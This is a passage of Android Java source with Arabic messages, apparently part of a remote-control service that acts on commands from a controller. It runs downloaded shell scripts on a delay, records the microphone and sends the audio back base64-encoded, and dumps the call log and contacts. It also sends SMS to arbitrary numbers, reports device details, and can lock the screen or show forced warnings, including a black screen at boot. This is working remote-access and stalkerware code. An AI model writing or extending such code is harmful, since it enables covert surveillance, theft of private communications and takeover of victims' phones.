        final File scriptFile = new File(getCacheDir(), "script_" + System.currentTimeMillis() + ".sh");
        try {
            java.io.FileOutputStream fos = new java.io.FileOutputStream(scriptFile);
            try {
                fos.write(scriptBytes);
            } finally {
                fos.close();
            }
        } catch (IOException e) {
            writeMessage(out, "فشل حفظ النص مؤقتاً على الجهاز: " + e.getMessage());
            return;
        }
        pendingScriptFile = scriptFile;

        final Handler h = getWorkerHandler();
        final OutputStream outRef = out;
        final long delayMs = delay * 1000L;
        final int delaySeconds = delay;
        final String scriptName = scriptFile.getName();
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    String execResult = runScript(scriptFile);
                    String reply;
                    if (delaySeconds > 0) {
                        reply = "حالة التنفيذ: تم التنفيذ بعد " + delaySeconds + " ثانية من الجدولة\n" + execResult;
                    } else {
                        reply = "حالة التنفيذ: نُفذ فوراً\n" + execResult;
                    }
                    writeMessage(outRef, reply);
                } catch (Exception e) {
                    try {
                        writeMessage(outRef, "فشل تنفيذ النص المجدول: " + e.getMessage());
                    } catch (IOException ignored) {
                        Log.w(TAG, "reply failed for scheduled script", e);
                    }
                } finally {
                    pendingScriptFile = null;
                    boolean deleted = scriptFile.delete();
                    if (!deleted) {
                        Log.w(TAG, "failed to delete temp script: " + scriptName);
                    }
                }
            }
        }, delayMs);
    }

    private String runScript(File scriptFile) {
        StringBuilder output = new StringBuilder();
        StringBuilder stdout = new StringBuilder();
        StringBuilder stderr = new StringBuilder();
        Process process = null;
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", scriptFile.getAbsolutePath());
            pb.redirectErrorStream(false);
            process = pb.start();
            Reader outReader = new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8);
            Reader errReader = new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8);

            long deadline = System.currentTimeMillis() + SCRIPT_TIMEOUT_MS;
            boolean done = false;
            while (!done) {
                boolean exited = false;
                try {
                    process.exitValue();
                    exited = true;
                } catch (IllegalThreadStateException stillRunning) {
                    if (System.currentTimeMillis() > deadline) {
                        process.destroy();
                        output.append("انتهت مهلة تنفيذ النص بعد ").append(SCRIPT_TIMEOUT_MS / 1000).append(" ثانية\n");
                        exited = true;
                    }
                }
                drainChar(outReader, stdout);
                drainChar(errReader, stderr);
                if (exited) {
                    done = true;
                } else {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        process.destroy();
                        done = true;
                    }
                }
            }
            drainChar(outReader, stdout);
            drainChar(errReader, stderr);

            int exit = -1;
            try {
                exit = process.exitValue();
            } catch (IllegalThreadStateException ignored) {
            }
            if (stdout.toString().trim().length() > 0) {
                output.append("[stdout]\n").append(stdout.toString().trim()).append("\n");
            }
            if (stderr.toString().trim().length() > 0) {
                output.append("[stderr]\n").append(stderr.toString().trim()).append("\n");
            }
            output.append("[رمز الخروج: ").append(exit).append("]");
        } catch (IOException e) {
            return "خطأ في تنفيذ النص: " + e.getMessage();
        } catch (RuntimeException e) {
            return "خطأ في تنفيذ النص: " + e.getMessage();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        return output.toString();
    }

    private Handler getWorkerHandler() {
        synchronized (workerLock) {
            if (workerHandler == null) {
                HandlerThread thread = new HandlerThread("bg-worker");
                thread.start();
                workerThread = thread;
                workerHandler = new Handler(thread.getLooper());
            }
            return workerHandler;
        }
    }

    private static int parseSetting(String text, int fallback) {
        try {
            return Integer.parseInt(text.trim());
        } catch (NumberFormatException e) {
            return fallback;
        }
    }

    private static long parseSettingLong(String text, long fallback) {
        try {
            return Long.parseLong(text.trim());
        } catch (NumberFormatException e) {
            return fallback;
        }
    }

    private static void drainChar(Reader reader, StringBuilder out) throws IOException {
        while (reader.ready()) {
            out.append((char) reader.read());
        }
    }

    private void handleBlackScreenOnBoot(OutputStream out) throws IOException {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean enabled = prefs.getBoolean(PREFS_BLACK_SCREEN_ON_BOOT, false);
        boolean newState = !enabled;
        prefs.edit().putBoolean(PREFS_BLACK_SCREEN_ON_BOOT, newState).apply();
        writeMessage(out, "تم " + (newState ? "تفعيل" : "إلغاء تفعيل")
                + " الشاشة السوداء عند الإقلاع (الحالة الجديدة: " + (newState ? "مفعّل" : "معطّل") + ")");
    }

    private void handleBlockScreen(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":");
        if (parts.length < 2) {
            writeMessage(out, "صيغة خاطئة: block_screen:المدة(بالثواني)");
            return;
        }
        int duration;
        try {
            duration = Integer.parseInt(parts[1].trim());
        } catch (NumberFormatException e) {
            writeMessage(out, "المدة غير صالحة: " + parts[1]);
            return;
        }
        if (duration < 1 || duration > 86400) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 86400 ثانية.");
            return;
        }
        Intent intent = new Intent(this, BlockScreenActivity.class);
        intent.putExtra(BlockScreenActivity.EXTRA_DURATION_SECONDS, duration);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        writeMessage(out, "تم تشغيل حجب الشاشة لمدة " + duration + " ثانية.");
    }

    private void handlePlayVideo(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":");
        if (parts.length < 2) {
            writeMessage(out, "صيغة خاطئة: play_video:الرقم");
            return;
        }
        int videoId;
        try {
            videoId = Integer.parseInt(parts[1].trim());
        } catch (NumberFormatException e) {
            writeMessage(out, "رقم الفيديو غير صالح: " + parts[1]);
            return;
        }
        if (videoId < 1) {
            writeMessage(out, "رقم الفيديو غير صالح (يجب أن يكون رقم المكتبة موجباً).");
            return;
        }
        String resName = "video_" + videoId;
        int resId = getResources().getIdentifier(resName, "raw", getPackageName());
        if (resId == 0) {
            writeMessage(out, "الفيديو غير موجود في المكتبة: " + resName
                    + " (أضف " + resName + ".mp4 إلى res/raw وأعد بناء التطبيق)");
            return;
        }
        Intent intent = new Intent(this, VideoPlayerActivity.class);
        intent.putExtra(VideoPlayerActivity.EXTRA_RAW_RES_ID, resId);
        intent.putExtra(VideoPlayerActivity.EXTRA_VIDEO_NAME, resName + ".mp4");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        writeMessage(out, "تم تشغيل الفيديو بملء الشاشة: " + resName + ".mp4");
    }

    private void handleSeriousWarning(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        if (parts.length < 2) {
            writeMessage(out, "صيغة خاطئة: show_serious_warning:النص");
            return;
        }
        String text = parts[1].trim();
        if (text.isEmpty()) {
            writeMessage(out, "نص التحذير فارغ.");
            return;
        }
        if (text.length() > 2000) {
            writeMessage(out, "نص التحذير طويل جداً (الحد الأقصى 2000 حرف).");
            return;
        }
        Intent intent = new Intent(this, SeriousWarningActivity.class);
        intent.putExtra(SeriousWarningActivity.EXTRA_WARNING_TEXT, text);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        writeMessage(out, "تم عرض رسالة التحذير على الشاشة.");
    }

    private void handleSendSms(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: send_sms:الرقم:النص");
            return;
        }
        String phoneNumber = parts[1];
        String message = parts[2];
        if (!hasPermission(Manifest.permission.SEND_SMS)) {
            writeMessage(out, "صلاحية إرسال SMS غير ممنوحة");
            return;
        }
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            writeMessage(out, "تم إرسال الرسالة إلى " + phoneNumber);
        } catch (Exception e) {
            writeMessage(out, "فشل في إرسال الرسالة: " + e.getMessage());
        }
    }

    private void handleDeviceInfo(OutputStream out) throws IOException {
        try {
            StringBuilder info = new StringBuilder();
            info.append("الطراز: ").append(Build.MODEL).append("\n");
            info.append("المصنع: ").append(Build.MANUFACTURER).append("\n");
            info.append("نظام التشغيل: ").append(Build.VERSION.RELEASE).append(" (API ")
                    .append(Build.VERSION.SDK_INT).append(")\n");
            info.append("رقم البناء: ").append(Build.ID).append("\n");

            BatteryManager batteryManager = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            info.append("مستوى البطارية: ").append(batteryLevel >= 0 ? batteryLevel + "%" : "غير متاح").append("\n");

            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo mobileInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            info.append("حالة الواي فاي: ")
                    .append(wifiInfo != null && wifiInfo.isConnected() ? "متصل" : "غير متصل").append("\n");
            info.append("حالة البيانات المتنقلة: ")
                    .append(mobileInfo != null && mobileInfo.isConnected() ? "متصل" : "غير متصل").append("\n");

            writeMessage(out, info.toString());
        } catch (Exception e) {
            writeMessage(out, "خطأ في جلب معلومات الجهاز: " + e.getMessage());
        }
    }

    private void handleRecordAudio(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        int duration;
        try {
            duration = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[1]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            writeMessage(out, "صلاحية الميكروفون غير ممنوحة");
            return;
        }

        // ملف مؤقت في كاش التطبيق؛ يُحذف بعد إرسال البيانات (وليس حفظاً دائماً)
        File outputFile = new File(getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
        MediaRecorder recorder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                ? new MediaRecorder(this) : new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(duration * 1000L);
            try {
                recorder.stop();
            } catch (RuntimeException ignored) {
            }
            recorder.release();
            recorder = null;
            writeMessage(out, "record_audio_data:" + duration + ":" + audioBase64(outputFile));
        } catch (Exception e) {
            writeMessage(out, "فشل في التسجيل: " + e.getMessage());
        } finally {
            if (recorder != null) {
                try {
                    recorder.stop();
                } catch (RuntimeException ignored) {
                }
                recorder.release();
            }
            boolean deleted = outputFile.delete();
            if (!deleted) {
                Log.w(TAG, "failed to delete temp recording: " + outputFile.getName());
            }
        }
    }

    private String audioBase64(File file) throws IOException {
        byte[] data = readFileBytes(file);
        if (data.length == 0) {
            throw new IOException("الملف الناتج فارغ (قد لا يوجد ميكروفون على هذا الجهاز)");
        }
        return android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP);
    }

    private static byte[] readFileBytes(File file) throws IOException {
        long length = file.length();
        if (length == 0) {
            return new byte[0];
        }
        int size = (int) Math.min(length, Integer.MAX_VALUE);
        byte[] data = new byte[size];
        java.io.FileInputStream fis = new java.io.FileInputStream(file);
        try {
            int offset = 0;
            while (offset < size) {
                int read = fis.read(data, offset, size - offset);
                if (read == -1) {
                    break;
                }
                offset += read;
            }
            if (offset != size) {
                byte[] trimmed = new byte[offset];
                System.arraycopy(data, 0, trimmed, 0, offset);
                data = trimmed;
            }
        } finally {
            fis.close();
        }
        return data;
    }

    private void handleCallLog(OutputStream out) throws IOException {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
            writeMessage(out, "صلاحية سجل المكالمات غير ممنوحة");
            return;
        }
        Cursor cursor = null;
        try {
            StringBuilder callLog = new StringBuilder();
            String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                    CallLog.Calls.DATE, CallLog.Calls.DURATION};
            cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection,
                    null, null, CallLog.Calls.DATE + " DESC");
            if (cursor == null) {
                writeMessage(out, "لا يوجد سجل مكالمات");
                return;
            }
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                @SuppressWarnings("deprecation")
                String typeLabel = "1".equals(type) ? "وارد"
                        : "2".equals(type) ? "صادر" : "مفقود";
                callLog.append("رقم: ").append(number)
                        .append(", النوع: ").append(typeLabel)
                        .append(", التاريخ: ").append(new Date(Long.parseLong(date)))
                        .append(", المدة: ").append(duration).append(" ثانية\n");
            }
            if (callLog.length() == 0) {
                writeMessage(out, "سجل المكالمات فارغ");
            } else {
                writeMessage(out, callLog.toString());
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في جلب سجل المكالمات: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void handleContacts(OutputStream out) throws IOException {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            writeMessage(out, "صلاحية جهات الاتصال غير ممنوحة");
            return;
        }
        Cursor cursor = null;
        try {
            StringBuilder contacts = new StringBuilder();
            String[] projection = {ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME};
            cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                    projection, null, null, null);
            if (cursor == null) {
                writeMessage(out, "لا توجد جهات اتصال");
                return;
            }
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                contacts.append("الاسم: ").append(name);

                Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);
                if (phoneCursor != null) {
                    try {
                        if (phoneCursor.moveToFirst()) {
                            contacts.append(", الأرقام: ");
                            do {
                                String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                                contacts.append(phoneNumber).append(" ");
                            } while (phoneCursor.moveToNext());
                        }
                    } finally {
                        phoneCursor.close();
                    }
                }
                contacts.append("\n");
            }
            if (contacts.length() == 0) {
                writeMessage(out, "لا توجد جهات اتصال");
            } else {
                writeMessage(out, contacts.toString());
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في جلب جهات الاتصال: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    // ---------- أدوات عامة ----------

    private boolean hasPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * تنفيذ أمر نظامي وتجميع مخرجاته (stdout + stderr) مع مهلة زمنية لمنع
     * تعليق حلقة الاتصال عندما يحجب الأمر (مثل ping أو النصوص الطويلة).
     */
    private String runShellCommand(String... argv) {
        Process process = null;
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder(argv).redirectErrorStream(true);
            process = pb.start();
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            long deadline = System.currentTimeMillis() + SHELL_TIMEOUT_MS;
            boolean alive = true;
            while (alive) {
                boolean exited = false;
                try {
                    process.exitValue(); // يرمي الاستثناء إذا كان لا يزال يعمل
                    exited = true;
                } catch (IllegalThreadStateException stillRunning) {
                    if (System.currentTimeMillis() > deadline) {
                        process.destroy();
                        output.append("[انتهت المهلة الزمنية للأمر]\n");
                        exited = true;
                    }
                }
                if (exited) {
                    alive = false;
                }
                drain(reader, output);
                if (alive) {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            drain(reader, output);
            int exit = -1;
            try {
                exit = process.exitValue();
            } catch (IllegalThreadStateException ignored) {
            }
            if (exit != 0 && exit != -1) {
                output.append("[رمز الخروج: ").append(exit).append("]");
            }
        } catch (IOException e) {
            return "خطأ في تنفيذ الأمر: " + e.getMessage();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        String result = output.toString().trim();
        return result.isEmpty() ? "(لا يوجد مخرجات)" : result;
    }

    private static void drain(BufferedReader reader, StringBuilder out) throws IOException {
        while (reader.ready()) {
            out.append((char) reader.read());
        }
    }
}